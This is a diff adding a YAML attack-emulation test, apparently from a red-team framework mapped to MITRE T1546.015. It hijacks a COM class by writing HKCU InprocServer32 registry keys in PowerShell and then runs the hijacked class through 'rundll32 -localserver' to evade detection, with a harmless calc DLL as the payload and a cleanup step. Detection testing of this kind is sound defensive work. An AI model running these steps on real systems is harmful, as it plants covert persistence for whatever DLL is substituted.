@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: COM Hijacking with RunDLL32 (Local Server Switch)
+description: "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. "
+args:
+    - name: clsid_threading
+      type: string
+      default: Both
+    - name: dll_path
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll
+    - name: clsid
+      type: string
+      default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+    - name: clsid_description
+      type: string
+      default: MSAA AccPropServices
+uuid: 123520cc-e998-471b-a920-bd28e3feafa0
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.015: Component Object Model Hijacking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: com-hijacking-with-rundll32-(local-server-switch)
+      inline: |-
+        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}' -Value '{{.Args.clsid_description}}'
+        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}\InprocServer32' -Value "{{.Args.dll_path}}"
+        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}\InprocServer32' -Name 'ThreadingModel' -Value '{{.Args.clsid_threading}}' -PropertyType "String"
+        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver {{.Args.clsid}}'
+      executor: powershell
+      cleanup:
+        inline: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}' -Recurse -ErrorAction Ignore
+        executor: powershell
